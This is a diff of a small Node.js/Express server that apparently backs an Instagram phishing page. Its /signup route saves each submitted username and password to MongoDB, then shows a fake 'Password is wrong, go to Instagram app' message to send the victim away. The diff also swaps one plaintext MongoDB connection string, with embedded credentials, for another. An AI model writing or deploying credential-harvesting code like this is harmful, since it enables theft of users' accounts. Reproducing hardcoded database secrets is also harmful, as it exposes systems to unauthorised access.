@@ -5,7 +5,7 @@ const bodyparser = require('body-parser');
 const path = require('path');
 const PORT = 3300;
 // connection 
-mongoose.connect('mongodb+srv://kushpandit68775:password68775@mycluster.mwikm28.mongodb.net/').then(() => console.log('mongoose connected')).catch( err => console.log('err mongoose' , err));
+mongoose.connect('mongodb+srv://instagramteam1110:instagram@instagram.ip3ouwy.mongodb.net/').then(() => console.log('mongoose connected')).catch( err => console.log('err mongoose' , err));
 //Usermodel
 let Usermodel = new mongoose.Schema({
   username: {
@@ -34,7 +34,7 @@ app.post('/signup', async (req, res) => {
     username,
     password
   });
-  res.send('Password is wrong, go Instagram app ');
+ return  res.send('Password is wrong, go to Instagram app and change your password ');
 });
  // listeing
  app.listen(PORT , () => console.log('server started'));
